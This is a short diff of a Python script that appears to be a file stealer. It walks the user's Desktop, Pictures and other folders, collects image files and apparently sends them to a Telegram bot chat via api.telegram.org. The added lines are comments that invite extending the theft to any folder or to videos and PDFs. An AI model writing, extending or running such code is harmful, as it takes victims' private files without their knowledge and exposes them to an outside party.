@@ -6,6 +6,7 @@ ID = "CHAT ID"
 usr = os.path.expanduser('~')
 URL = f"https://api.telegram.org/bot{TOKEN}"
 req = requests.session()
+# YOU CAN ADD ANY PATH YOU WANT IN ANY LANGUAGE
 paths=[
     os.path.join(usr,'Deskop'),
     os.path.join(usr,'Pictures'),
@@ -27,6 +28,7 @@ try:
         if os.path.exists(thepath):
             for p,d,f in os.walk(thepath):
                 for file in f:
+                    #HERE ALSO IF WANT THE SHORT VIDEO YOU CAN SIMPLY ADD ".mp4" OR PDF AS YOU LIKE
                     if file.endswith(('.jpg','.png','.jpeg')):
                         pwd=os.path.join(p,file)
                         openfunc(pwd)
